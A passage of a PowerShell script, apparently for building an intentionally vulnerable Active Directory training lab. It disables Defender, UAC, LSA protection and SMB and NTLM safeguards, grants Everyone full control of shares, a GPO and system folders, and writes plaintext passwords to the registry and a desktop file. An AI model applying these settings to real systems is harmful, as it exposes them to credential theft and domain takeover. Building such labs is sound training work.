    Set-Service -Name wuauserv -StartupType Disabled -ErrorAction SilentlyContinue

    # Disable Windows Defender real-time protection
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue

    # Disable SmartScreen
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force

    Write-Log "Vulnerable system settings configured" -Level SUCCESS
    return $true
  }
  catch {
    Write-Log "Error configuring vulnerable settings: $_" -Level ERROR
    return $false
  }
}

<#
.SYNOPSIS
    Orchestrates the configuration of all vulnerable settings.
.DESCRIPTION
    This is the main function that coordinates the creation of vulnerable users,
    configuration of system settings, and application of security misconfigurations.
#>
function Invoke-VulnerabilityConfiguration {
  [CmdletBinding()]
  param()

  Write-Log "Configuring intentional vulnerabilities..." -Level INFO

  # Create VulnerableShare directory first (required by many functions)
  try {
    $sharePath = "C:\VulnerableShare"
    if (-not (Test-Path $sharePath)) {
      New-Item -Path $sharePath -ItemType Directory -Force | Out-Null
      Write-Log "Created VulnerableShare directory: $sharePath" -Level INFO
    }

    # Set permissions for the share
    icacls $sharePath /grant "Everyone:(F)" /T 2>$null

    # Create SMB share if not exists
    if (-not (Get-SmbShare -Name "VulnerableShare" -ErrorAction SilentlyContinue)) {
      New-SmbShare -Name "VulnerableShare" -Path $sharePath -FullAccess "Everyone" -ReadAccess "Everyone" -ErrorAction SilentlyContinue
      Write-Log "Created VulnerableShare SMB share" -Level INFO
    }
  }
  catch {
    Write-Log "Warning: Could not create VulnerableShare directory: $_" -Level WARNING
  }

  # Configure domain password policy FIRST (before creating users with weak passwords)
  Write-Log "Configuring domain password policy..." -Level INFO

  try {
    # Get current OS version for compatibility
    $osVersion = [System.Environment]::OSVersion.Version
    $isModernServer = ($osVersion.Major -ge 10 -and $osVersion.Build -ge 20348) # Server 2022+

    if ($isModernServer) {
      Write-Log "Detected modern Windows Server - applying compatible password policy" -Level INFO

      # For newer servers, we need to be more careful with password policies
      # Set minimum requirements that work with Server 2025
      $policyParams = @{
        Identity             = $Script:DomainConfig.DomainName
        ComplexityEnabled    = $false  # Disable complexity for lab environment
        MinPasswordLength    = 3       # Minimum that newer servers will accept
        MinPasswordAge       = [TimeSpan]::FromDays(0)
        MaxPasswordAge       = [TimeSpan]::FromDays(0)  # Never expire
        PasswordHistoryCount = 0
        ErrorAction          = 'Stop'
      }
    }
    else {
      Write-Log "Detected legacy Windows Server - applying standard password policy" -Level INFO

      # For older servers, use the original weak settings
      $policyParams = @{
        Identity             = $Script:DomainConfig.DomainName
        ComplexityEnabled    = $Script:VulnConfig.PasswordPolicy.ComplexityEnabled
        MinPasswordLength    = $Script:VulnConfig.PasswordPolicy.MinPasswordLength
        MinPasswordAge       = [TimeSpan]::FromDays($Script:VulnConfig.PasswordPolicy.MinPasswordAge)
        MaxPasswordAge       = [TimeSpan]::FromDays($Script:VulnConfig.PasswordPolicy.MaxPasswordAge)
        PasswordHistoryCount = $Script:VulnConfig.PasswordPolicy.PasswordHistoryCount
        ErrorAction          = 'Stop'
      }
    }

    Set-ADDefaultDomainPasswordPolicy @policyParams
    Write-Log "Domain password policy configured successfully" -Level SUCCESS

    # Configure account lockout policy
    try {
      Set-ADDefaultDomainPasswordPolicy -Identity $Script:DomainConfig.DomainName `
        -LockoutThreshold $Script:VulnConfig.AccountPolicies.LockoutThreshold `
        -LockoutDuration ([TimeSpan]::FromMinutes($Script:VulnConfig.AccountPolicies.LockoutDuration)) `
        -LockoutObservationWindow ([TimeSpan]::FromMinutes($Script:VulnConfig.AccountPolicies.ResetLockoutCount)) `
        -ErrorAction Stop
      Write-Log "Account lockout policy configured successfully" -Level SUCCESS
    }
    catch {
      Write-Log "Warning: Could not configure account lockout policy: $_" -Level WARNING
    }

  }
  catch {
    Write-Log "Error configuring password policy: $_" -Level ERROR

    # Fallback: Try to set individual policies
    Write-Log "Attempting fallback password policy configuration..." -Level WARNING

    try {
      # Use net.exe as fallback for older systems
      $commands = @(
        "net accounts /minpwlen:3",
        "net accounts /maxpwage:unlimited",
        "net accounts /minpwage:0",
        "net accounts /uniquepw:0",
        "net accounts /lockoutthreshold:0"
      )

      foreach ($cmd in $commands) {
        try {
          Invoke-Expression $cmd | Out-Null
        }
        catch {
          Write-Log "Warning: Command failed: $cmd" -Level WARNING
        }
      }

      Write-Log "Fallback password policy applied using net accounts" -Level INFO
    }
    catch {
      Write-Log "Fallback password policy configuration also failed: $_" -Level ERROR
    }
  }

  # Create OUs and Groups BEFORE creating users (Fix for OU timing issue)
  Write-Log "Creating organizational structure..." -Level INFO
  try {
    # Create OUs
    $domainDN = (Get-ADDomain).DistinguishedName
    foreach ($ou in $Script:UserConfig.OUs) {
      if (![string]::IsNullOrWhiteSpace($ou.Name)) {
        if (-not (Get-ADOrganizationalUnit -Filter "Name -eq '$($ou.Name)'" -SearchBase $domainDN -ErrorAction SilentlyContinue)) {
          try {
            New-ADOrganizationalUnit -Name $ou.Name -Path $domainDN -ProtectedFromAccidentalDeletion $false -ErrorAction Stop
            Write-Log "Created OU: $($ou.Name)" -Level INFO
          }
          catch {
            Write-Log "Error creating OU '$($ou.Name)': $_" -Level WARNING
          }
        }
        else {
          Write-Log "OU '$($ou.Name)' already exists" -Level WARNING
        }
      }
      else {
        Write-Log "OU is missing Name" -Level Warning
      }
    }

    # Create security groups
    foreach ($group in $Script:UserConfig.Groups) {
      try {
        if (-not (Get-ADGroup -Filter "Name -eq '$($group.Name)'" -ErrorAction SilentlyContinue)) {
          New-ADGroup -Name $group.Name -GroupScope Global -Description $group.Description -ErrorAction Stop
          Write-Log "Created group: $($group.Name)" -Level INFO
        }
        else {
          Write-Log "Already exists : $($group.Name)" -Level INFO
        }
      }
      catch {
        if ($_.Exception.Message -like "*already exists*") {
          Write-Log "Group '$($group.Name)' already exists" -Level WARNING
        }
        else {
          Write-Log "Error creating group '$($group.Name)': $_" -Level WARNING
        }
      }
    }
    Write-Log "Organizational structure creation completed" -Level SUCCESS
  }
  catch {
    Write-Log "Error creating organizational structure: $_" -Level ERROR
  }

  # Configure vulnerable GPOs
  if (Set-VulnerableGPOs) {
    Write-Log "Successfully configured vulnerable GPOs" -Level INFO
  }
  else {
    Write-Log "Failed to configure vulnerable GPOs" -Level WARNING
  }

  # Setup Vulnerable users (now OUs exist)
  if (Set-VulnerableUsers) {
    Write-Log "Successfully configured vulnerable users" -Level INFO
  }
  else {
    Write-Log "Failed to configure vulnerable users" -Level WARNING
  }

  # Set up unconstrained delegation
  if (Set-UnconstrainedDelegation) {
    Write-Log "Successfully configured unconstrained delegation" -Level INFO
  }
  else {
    Write-Log "Failed to configure unconstrained delegation" -Level WARNING
  }

  # Set up constrained delegation
  if (Set-ConstrainedDelegation) {
    Write-Log "Successfully configured constrained delegation" -Level INFO
  }
  else {
    Write-Log "Failed to configure constrained delegation" -Level WARNING
  }

  # Set up RBCD vulnerabilities
  if (Set-RBCD) {
    Write-Log "Successfully configured RBCD vulnerabilities" -Level INFO
  }
  else {
    Write-Log "Failed to configure RBCD vulnerabilities" -Level WARNING
  }

  # Enable LLMNR/NBT-NS poisoning
  if (Enable-LLMNRPoisoning) {
    Write-Log "Successfully enabled LLMNR/NBT-NS poisoning" -Level INFO
  }
  else {
    Write-Log "Failed to enable LLMNR/NBT-NS poisoning" -Level WARNING
  }

  # Configure vulnerable WSUS
  if (Set-VulnerableWSUS) {
    Write-Log "Successfully configured vulnerable WSUS" -Level INFO
  }
  else {
    Write-Log "Failed to configure vulnerable WSUS" -Level WARNING
  }

  # Enable Print Spooler vulnerabilities
  if (Enable-PrintSpoolerVuln) {
    Write-Log "Successfully enabled Print Spooler vulnerabilities" -Level INFO
  }
  else {
    Write-Log "Failed to enable Print Spooler vulnerabilities" -Level WARNING
  }

  # Set up Shadow Credentials
  if (Set-ShadowCredentials) {
    Write-Log "Successfully configured Shadow Credentials vulnerabilities" -Level INFO
  }
  else {
    Write-Log "Failed to configure Shadow Credentials vulnerabilities" -Level WARNING
  }

  # Grant DCSync rights
  if (Grant-DCSync) {
    Write-Log "Successfully granted DCSync rights" -Level INFO
  }
  else {
    Write-Log "Failed to grant DCSync rights" -Level WARNING
  }

  # Create weak SPN accounts
  if (Set-WeakSPNs) {
    Write-Log "Successfully created weak SPN accounts" -Level INFO
  }
  else {
    Write-Log "Failed to create weak SPN accounts" -Level WARNING
  }

  # Set up LAPS bypass
  if (Set-LAPSBypass) {
    Write-Log "Successfully configured LAPS bypass" -Level INFO
  }
  else {
    Write-Log "Failed to configure LAPS bypass" -Level WARNING
  }

  # Set weak certificate template ACLs
  if (Set-WeakCertTemplateACLs) {
    Write-Log "Successfully configured weak certificate template ACLs" -Level INFO
  }
  else {
    Write-Log "Failed to configure weak certificate template ACLs" -Level WARNING
  }

  # Configure DNS Admin vulnerability
  if (Set-DNSAdminVulnerability) {
    Write-Log "Successfully configured DNS Admin vulnerability" -Level INFO
  }
  else {
    Write-Log "Failed to configure DNS Admin vulnerability" -Level WARNING
  }

  # Configure Machine Account Quota
  if (Set-MachineAccountQuota) {
    Write-Log "Successfully configured Machine Account Quota vulnerability" -Level INFO
  }
  else {
    Write-Log "Failed to configure Machine Account Quota vulnerability" -Level WARNING
  }

  # Configure Backup Operators vulnerability
  if (Set-BackupOperatorsVulnerability) {
    Write-Log "Successfully configured Backup Operators vulnerability" -Level INFO
  }
  else {
    Write-Log "Failed to configure Backup Operators vulnerability" -Level WARNING
  }

  # Configure Account Operators vulnerability
  if (Set-AccountOperatorsVulnerability) {
    Write-Log "Successfully configured Account Operators vulnerability" -Level INFO
  }
  else {
    Write-Log "Failed to configure Account Operators vulnerability" -Level WARNING
  }

  # Configure Pre-Windows 2000 Compatible Access
  if (Set-PreWin2000CompatibleAccess) {
    Write-Log "Successfully configured Pre-Windows 2000 Compatible Access vulnerability" -Level INFO
  }
  else {
    Write-Log "Failed to configure Pre-Windows 2000 Compatible Access vulnerability" -Level WARNING
  }

  # Configure ADIDNS poisoning
  if (Set-ADIDNSPoisoning) {
    Write-Log "Successfully configured ADIDNS poisoning vulnerability" -Level INFO
  }
  else {
    Write-Log "Failed to configure ADIDNS poisoning vulnerability" -Level WARNING
  }

  # Configure SYSVOL vulnerabilities
  if (Set-SYSVOLVulnerabilities) {
    Write-Log "Successfully configured SYSVOL vulnerabilities" -Level INFO
  }
  else {
    Write-Log "Failed to configure SYSVOL vulnerabilities" -Level WARNING
  }

  # Configure advanced certificate vulnerabilities
  if (Set-AdvancedCertificateVulnerabilities) {
    Write-Log "Successfully configured advanced certificate vulnerabilities (ESC8-ESC10)" -Level INFO
  }
  else {
    Write-Log "Failed to configure advanced certificate vulnerabilities" -Level WARNING
  }

  # Set privileged group misconfigurations
  if (Set-PrivilegedGroupMisconfigs) {
    Write-Log "Successfully configured privileged group misconfigurations" -Level INFO
  }
  else {
    Write-Log "Failed to configure privileged group misconfigurations" -Level WARNING
  }

  # Set up user disclosure methods
  if (Set-UserDisclosureMethods) {
    Write-Log "Successfully configured user disclosure methods" -Level INFO
  }
  else {
    Write-Log "Failed to configure user disclosure methods" -Level WARNING
  }

  # Create vulnerable scheduled tasks
  if (Set-VulnerableScheduledTasks) {
    Write-Log "Successfully created vulnerable scheduled tasks" -Level INFO
  }
  else {
    Write-Log "Failed to create vulnerable scheduled tasks" -Level WARNING
  }

  # Create vulnerable services
  if (Set-VulnerableServices) {
    Write-Log "Successfully created vulnerable services" -Level INFO
  }
  else {
    Write-Log "Failed to create vulnerable services" -Level WARNING
  }

  # OUs and Groups are now created earlier in the function - no need to duplicate here
  try {
    # Password policy has already been configured at the beginning of this function

    # Configure SMB settings with error handling
    try {
      Set-SmbServerConfiguration -EncryptData $false -ErrorAction SilentlyContinue
      if ($?) { Write-Log "SMB encryption disabled" -Level INFO } else { Write-Log "Failed to disable SMB encryption" -Level WARNING }

      Set-SmbServerConfiguration -EnableSMB1Protocol $Script:VulnConfig.SMB.SMB1Enabled -ErrorAction SilentlyContinue
      if ($?) { Write-Log "SMB1 protocol configured" -Level INFO } else { Write-Log "Failed to configure SMB1 protocol" -Level WARNING }

      Set-SmbServerConfiguration -EnableSMB2Protocol $Script:VulnConfig.SMB.SMB2Enabled -ErrorAction SilentlyContinue
      if ($?) { Write-Log "SMB2 protocol configured" -Level INFO } else { Write-Log "Failed to configure SMB2 protocol" -Level WARNING }

      Set-SmbServerConfiguration -RequireSecuritySignature $Script:VulnConfig.SMB.SigningRequired -ErrorAction SilentlyContinue
      if ($?) { Write-Log "SMB security signature configured" -Level INFO } else { Write-Log "Failed to configure SMB security signature" -Level WARNING }

      Write-Log "SMB configuration completed" -Level INFO
    }
    catch {
      Write-Log "Error configuring SMB settings: $_" -Level WARNING
    }

    # Configure RDP with weak security settings
    try {
      Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name 'fDenyTSConnections' -Value 0 -Force
      Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name 'UserAuthentication' -Value 0 -Force
      Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name 'SecurityLayer' -Value 0 -Force  # Allow connections from any version
      Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name 'MinEncryptionLevel' -Value 1 -Force  # Low encryption
      Write-Log "RDP configuration completed" -Level INFO
    }
    catch {
      Write-Log "Error configuring RDP settings: $_" -Level WARNING
    }

    # Enable NTLM Authentication (vulnerable to NTLM relay attacks)
    try {
      Write-Log "Configuring NTLM authentication for maximum vulnerability..." -Level INFO

      # Ensure MSV1_0 registry key exists
      $msv1Path = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0'
      if (-not (Test-Path $msv1Path)) {
        New-Item -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name 'MSV1_0' -Force | Out-Null
        Write-Log "Created MSV1_0 registry key" -Level DEBUG
      }

      # Set NTLM to minimum security (most vulnerable) - Critical for authentication
      Set-ItemProperty -Path $msv1Path -Name 'NTLMMinServerSec' -Type DWord -Value 0x00000000 -Force
      Set-ItemProperty -Path $msv1Path -Name 'NTLMMinClientSec' -Type DWord -Value 0x00000000 -Force
      Write-Log "Set NTLM minimum security to 0x00000000" -Level DEBUG

      # Allow NTLM traffic (don't restrict it)
      Set-ItemProperty -Path $msv1Path -Name 'RestrictSendingNTLMTraffic' -Type DWord -Value 0 -Force
      Set-ItemProperty -Path $msv1Path -Name 'RestrictReceivingNTLMTraffic' -Type DWord -Value 0 -Force
      Write-Log "Disabled NTLM traffic restrictions" -Level DEBUG

      # Set LM Compatibility Level to 2 (compatible with older NTLM versions)
      Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name 'LmCompatibilityLevel' -Type DWord -Value 2 -Force
      Write-Log "Set LM Compatibility Level to 2" -Level DEBUG

      # Additional NTLM settings for maximum compatibility
      Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name 'NoLMHash' -Type DWord -Value 0 -Force
      Set-ItemProperty -Path $msv1Path -Name 'AuditReceivingNTLMTraffic' -Type DWord -Value 0 -Force -ErrorAction SilentlyContinue
      Set-ItemProperty -Path $msv1Path -Name 'RestrictSendingNTLMAudit' -Type DWord -Value 0 -Force -ErrorAction SilentlyContinue

      # Ensure NTLM is enabled for network authentication
      Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name 'DisableDomainCreds' -Type DWord -Value 0 -Force -ErrorAction SilentlyContinue

      Write-Log "NTLM authentication configured for maximum vulnerability and compatibility" -Level SUCCESS
    }
    catch {
      Write-Log "Error configuring NTLM settings: $_" -Level ERROR
      Write-Log "NTLM authentication may not work properly - manual configuration may be required" -Level WARNING
    }

    # Enable LLMNR and NetBIOS (vulnerable to spoofing)
    try {
      New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient' -Force -ErrorAction SilentlyContinue | Out-Null
      Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient' -Name 'EnableMulticast' -Type DWord -Value 1 -Force
      Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NetBT\Parameters' -Name 'EnableLMHOSTS' -Type DWord -Value 1 -Force
      Write-Log "LLMNR and NetBIOS configuration completed" -Level INFO
    }
    catch {
      Write-Log "Error configuring LLMNR/NetBIOS settings: $_" -Level WARNING
    }

    # Disable SMBv3 encryption (vulnerable to SMB attacks)
    try {
      Set-SmbServerConfiguration -EncryptData $false -Force -ErrorAction Stop
      Set-SmbServerConfiguration -RejectUnencryptedAccess $false -Force -ErrorAction Stop
      Write-Log "SMBv3 encryption disabled" -Level INFO
    }
    catch {
      Write-Log "Error disabling SMBv3 encryption: $_" -Level WARNING
    }

    # Enable WPAD (vulnerable to proxy attacks)
    try {
      Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' -Name 'AutoDetect' -Type DWord -Value 1 -Force -ErrorAction SilentlyContinue
      Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings' -Name 'AutoConfigURL' -Type String -Value 'http://wpad.lab.local/wpad.dat' -Force -ErrorAction SilentlyContinue
      Write-Log "WPAD configuration completed" -Level INFO
    }
    catch {
      Write-Log "Error configuring WPAD settings: $_" -Level WARNING
    }

    # Create vulnerable GPOs
    $gpoName = "Vulnerable GPO"
    try {
      $gpo = New-GPO -Name $gpoName -Comment "Intentionally vulnerable GPO for security training" -ErrorAction Stop
    }
    catch {
      if ($_.Exception.Message -match "already exists") {
        Write-Log "GPO '$gpoName' already exists, attempting to use existing GPO" -Level WARNING
        try {
          $gpo = Get-GPO -Name $gpoName -ErrorAction Stop
        }
        catch {
          Write-Log "Could not retrieve existing GPO '$gpoName': $_" -Level WARNING
          $gpo = $null
        }
      }
      else {
        Write-Log "Error creating GPO '$gpoName': $_" -Level WARNING
        $gpo = $null
      }
    }

    if ($gpo) {
      # Configure vulnerable GPO settings
      $gpo | Set-GPPrefRegistryValue -Context Computer -Action Update -Key 'HKLM\SOFTWARE\Policies\Microsoft\Windows\System' -ValueName 'EnableSmartScreen' -Type DWord -Value 0
      $gpo | Set-GPPrefRegistryValue -Context Computer -Action Update -Key 'HKLM\SOFTWARE\Policies\Microsoft\Windows\System' -ValueName 'EnableLUA' -Type DWord -Value 0

      # Link GPO to domain
      try {
        $gpo | New-GPLink -Target "dc=$($Script:DomainConfig.DomainName.Split('.')[0]),dc=$($Script:DomainConfig.DomainName.Split('.')[1])" -LinkEnabled Yes -ErrorAction Stop
      }
      catch {
        Write-Log "Warning: Could not link GPO (may already be linked): $_" -Level WARNING
      }

      # Set GPO permissions to allow everyone to edit (vulnerable to GPO abuse)
      try {
        $gpoGUID = $gpo.Id.ToString()
        $gpoPath = "AD:$((Get-ADDomain).DistinguishedName)\System\Policies\{$gpoGUID}"

        # Check if the GPO path exists before trying to modify ACL
        if (Test-Path $gpoPath) {
          $acl = Get-Acl -Path $gpoPath
          $identity = New-Object System.Security.Principal.NTAccount("Everyone")
          $accessRule = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($identity, 'GenericAll', 'Allow')
          $acl.AddAccessRule($accessRule)
          Set-Acl -Path $gpoPath -AclObject $acl
          Write-Log "Set vulnerable GPO permissions for: $gpoName" -Level INFO
        }
        else {
          Write-Log "Warning: GPO path not found, skipping ACL modification: $gpoPath" -Level WARNING
        }
      }
      catch {
        Write-Log "Warning: Could not set GPO permissions: $_" -Level WARNING
      }

      Write-Log "Created vulnerable GPO: $gpoName" -Level INFO
    }

    # Create vulnerable DNS records (vulnerable to DNS spoofing)
    try {
      Add-DnsServerResourceRecordA -Name "fileserver" -ZoneName $Script:DomainConfig.DomainName -IPv4Address "169.254.0.1" -ErrorAction Stop
      Write-Log "Created DNS record: fileserver -> 169.254.0.1" -Level INFO
    }
    catch {
      if ($_.Exception.Message -match "already exists") {
        Write-Log "DNS record 'fileserver' already exists" -Level WARNING
      }
      else {
        Write-Log "Warning: Could not create DNS record 'fileserver': $_" -Level WARNING
      }
    }

    try {
      Add-DnsServerResourceRecordA -Name "sharepoint" -ZoneName $Script:DomainConfig.DomainName -IPv4Address "169.254.0.2" -ErrorAction Stop
      Write-Log "Created DNS record: sharepoint -> 169.254.0.2" -Level INFO
    }
    catch {
      if ($_.Exception.Message -match "already exists") {
        Write-Log "DNS record 'sharepoint' already exists" -Level WARNING
      }
      else {
        Write-Log "Warning: Could not create DNS record 'sharepoint': $_" -Level WARNING
      }
    }

    # Enable WDigest (stores credentials in memory)
    Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name 'UseLogonCredential' -Type DWord -Value 1 -Force

    # Disable LSA Protection (vulnerable to credential dumping)
    Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\LSA' -Name 'RunAsPPL' -Type DWord -Value 0 -Force

    # Disable Windows Defender (vulnerable to malware)
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen $true -ErrorAction SilentlyContinue

    # Create vulnerable scheduled tasks
    if (-not (Get-Module -ListAvailable -Name ScheduledTasks)) {
      Write-Log "ScheduledTasks module is not available. Skipping scheduled task creation." -Level WARNING
    }
    Import-Module ScheduledTasks -ErrorAction SilentlyContinue -Verbose:$false
    $action = New-ScheduledTaskAction -Execute 'cmd.exe' -Argument '/c echo Vulnerable task > C:\vulnerable.txt'
    if (-not $action) {
      Write-Log "Failed to create ScheduledTaskAction. Skipping scheduled task creation." -Level ERROR
      return $false
    }

    $trigger = New-ScheduledTaskTrigger -AtLogOn
    try {
      Register-ScheduledTask -TaskName "VulnerableTask" -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest -Force
    }
    catch {
      Write-Log "Failed to register scheduled task: $_" -Level ERROR
    }

    # Create vulnerable service
    New-Service -Name "VulnerableService" -BinaryPathName "C:\Windows\System32\cmd.exe /c echo Vulnerable service > C:\service_vuln.txt" -DisplayName "Vulnerable Service" -StartupType Automatic -ErrorAction SilentlyContinue

    # Create writable share for user enumeration
    $sharePath = "C:\VulnerableShare"
    if (-not (Test-Path $sharePath)) {
      New-Item -Path $sharePath -ItemType Directory -Force | Out-Null

      # Create username wordlist from existing users
      $users = Get-ADUser -Filter * -Properties * | Where-Object { $_.Enabled -eq $true }
      $usernames = $users | ForEach-Object { $_.SamAccountName }

      # Write usernames to wordlist file
      $usernames | Out-File -FilePath "$sharePath\usernames_wordlist.txt" -Force

      # Add other potentially sensitive files (without real credentials)
      "This is a sample sensitive file. In a real environment, this might contain sensitive data." |
      Out-File -FilePath "$sharePath\sensitive_data.txt" -Force

      "Sample database connection string: Server=sql01;Database=appdb;Trusted_Connection=yes;" |
      Out-File -FilePath "$sharePath\db_connection.txt" -Force

      # Create a fake password policy document
      @"
            Password Policy:
            - Minimum length: 8 characters
            - Complexity requirements: Disabled
            - Password history: Not enforced
            - Account lockout: Disabled
            - Password expiration: Never
"@ | Out-File -FilePath "$sharePath\password_policy.txt" -Force

      # Set weak permissions
      icacls $sharePath /grant "Everyone:(OI)(CI)F" /T

      # Create the share with full access for everyone
      New-SmbShare -Name "VulnerableShare" -Path $sharePath -FullAccess "Everyone" -ReadAccess "Everyone" -ErrorAction SilentlyContinue

      Write-Log "Created vulnerable share at $sharePath with wordlist and sample files" -Level INFO

      # Log the created users for reference (without passwords)
      Write-Log "Created the following users: $($usernames -join ', ')" -Level INFO
    }

    # Create vulnerable registry keys
    New-Item -Path 'HKLM:\SOFTWARE\VulnerableApp' -Force | Out-Null
    Set-ItemProperty -Path 'HKLM:\SOFTWARE\VulnerableApp' -Name 'DatabasePassword' -Value 's3cr3tDBp@ss' -Type String -Force
    Set-ItemProperty -Path 'HKLM:\SOFTWARE\VulnerableApp' -Name 'EncryptionKey' -Value 'A1B2C3D4E5F6' -Type String -Force

    # Set weak file permissions on sensitive directories
    $sensitiveDirs = @('C:\Windows\Temp', 'C:\inetpub', 'C:\Program Files\VulnerableApp')
    foreach ($dir in $sensitiveDirs) {
      if (Test-Path $dir) {
        icacls $dir /grant "Everyone:(OI)(CI)F" /T /C
      }
    }

    # Create vulnerable web applications with proper error handling
    $iisPath = "C:\inetpub\vulnapp"
    try {
      if (-not (Test-Path $iisPath)) {
        # Create directory
        New-Item -Path $iisPath -ItemType Directory -Force | Out-Null

        # Create sample vulnerable ASPX file
        $aspxContent = @'
<%@ Page Language="C#" %>
<%= "Hello, " + (Request.QueryString["name"] ?? "Guest") + "!" %>
'@
        $aspxContent | Out-File -FilePath "$iisPath\default.aspx" -Force

        # Create sample vulnerable PHP file
        $phpContent = @'
<?php
echo "Hello, " . (isset($_GET['name']) ? htmlspecialchars($_GET['name']) : 'Guest') . '!';
?>
'@
        $phpContent | Out-File -FilePath "$iisPath\index.php" -Force

        # Set permissions
        icacls $iisPath /grant "Everyone:(OI)(CI)F" /T

        # Register with IIS if available
        if (Get-Command "New-WebApplication" -ErrorAction SilentlyContinue) {
          Import-Module WebAdministration -ErrorAction SilentlyContinue -Verbose:$false
          if (-not (Test-Path "IIS:\Sites\Default Web Site\vulnapp")) {
            New-WebApplication -Name "vulnapp" -Site "Default Web Site" -PhysicalPath $iisPath -Force -ErrorAction SilentlyContinue
            Write-Log "Registered web application in IIS: $iisPath" -Level INFO
          }
        }

        Write-Log "Created vulnerable web application at: $iisPath" -Level INFO
      }
    }
    catch {
      Write-Log "Error creating web application: $_" -Level ERROR
    }

    # Create vulnerable SQL logins with proper error handling
    try {
      # Check if SQL Server is running
      $sqlService = Get-Service -Name "MSSQLSERVER" -ErrorAction SilentlyContinue

      if ($sqlService -and $sqlService.Status -eq 'Running') {
        $sqlQuery = @"
                IF NOT EXISTS (SELECT * FROM sys.server_principals WHERE name = 'vuln_sa')
                BEGIN
                    CREATE LOGIN [vuln_sa] WITH PASSWORD = 'sql', CHECK_POLICY = OFF;
                    ALTER SERVER ROLE [sysadmin] ADD MEMBER [vuln_sa];
                END
"@
        Invoke-Sqlcmd -Query $sqlQuery -ServerInstance "." -ErrorAction Stop
        Write-Log "Created vulnerable SQL login: vuln_sa" -Level INFO
      }
      else {
        Write-Log "SQL Server service not running, skipping SQL login creation" -Level WARNING
      }
    }
    catch {
      Write-Log "Error creating SQL login: $_" -Level WARNING
    }

    # Enable remote management with proper error handling
    try {
      # Check if WinRM service is running
      $winRmService = Get-Service -Name "WinRM" -ErrorAction SilentlyContinue

      if (-not $winRmService) {
        Write-Log "WinRM service not found, PSRemoting is not available" -Level WARNING
      }
      else {
        # Configure PSRemoting
        Enable-PSRemoting -Force -SkipNetworkProfileCheck -ErrorAction Stop -Verbose:$false

        # Configure WinRM for basic authentication (for demonstration purposes only)
        Set-Item -Path "WSMan:\localhost\Service\AllowUnencrypted" -Value $true -Force
        Set-Item -Path "WSMan:\localhost\Service\Auth\Basic" -Value $true -Force

        # Restart WinRM service to apply changes
        try {
          Write-Log "Restarting WinRM service..." -Level INFO
          Restart-Service WinRM -Force -ErrorAction Stop
          Write-Log "WinRM service restarted successfully" -Level SUCCESS
        }
        catch {
          Write-Log "Failed to restart WinRM service: $_" -Level WARNING
        }

        Write-Log "PSRemoting enabled with basic authentication" -Level INFO
      }
    }
    catch {
      Write-Log "Error configuring PSRemoting: $_" -Level ERROR
    }

    # Display vulnerability summary
    Write-VulnerabilitySummary

    # Create comprehensive passwords file
    try {
      $adminPasswordText = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Script:DomainConfig.DomainAdminPassword))
      $safeModePasswordText = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($Script:DomainConfig.SafeModePassword))
      # Create passwords file on desktop for easy access
      $desktopPath = [Environment]::GetFolderPath('Desktop')
      $passwordsPath = Join-Path $desktopPath "passwords.txt"
      New-PasswordsFile -FilePath $passwordsPath -AdminPassword $adminPasswordText -SafeModePassword $safeModePasswordText
    }
    catch {
      Write-Log "Warning: Could not create passwords file: $_" -Level WARNING
    }

    Write-Log "Vulnerability configuration completed with $(if($error.Count -gt 0) { 'some warnings' } else { 'no errors' })" -Level SUCCESS
    return $true
  }
  catch {
    Write-Log "Error configuring vulnerabilities: $_" -Level ERROR
    return $false
  }
}

# Function to create User:Password file with actual created accounts
function New-PasswordsFile {
  param(
    [string]$FilePath = "passwords.txt",
    [string]$AdminPassword,
    [string]$SafeModePassword
  )

  try {
    Write-Log "Creating User:Password file: $FilePath" -Level INFO

    # Build the password file content with actual User:Password pairs
    $passwordContent = @()
    $passwordContent += "# HackLab AD4 - User:Password List"
    $passwordContent += "# Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
    $passwordContent += "# Format: Username:Password"
    $passwordContent += "# WARNING: Contains all passwords for lab environment"
    $passwordContent += ""

    # Add system accounts
    $passwordContent += "# System Accounts"
    $passwordContent += "Administrator:$AdminPassword"
    $passwordContent += "Guest:" # Guest has no password
    $passwordContent += ""

    # Add predefined domain users
    $passwordContent += "# Domain Users"
    foreach ($user in $Script:UserConfig.WeakPasswordUsers) {
      $groups = if ($user.Groups -and $user.Groups.Count -gt 0) { " # Groups: $($user.Groups -join ', ')" } else { "" }
      $passwordContent += "$($user.Name):$($user.Password)$groups"
    }
    $passwordContent += ""

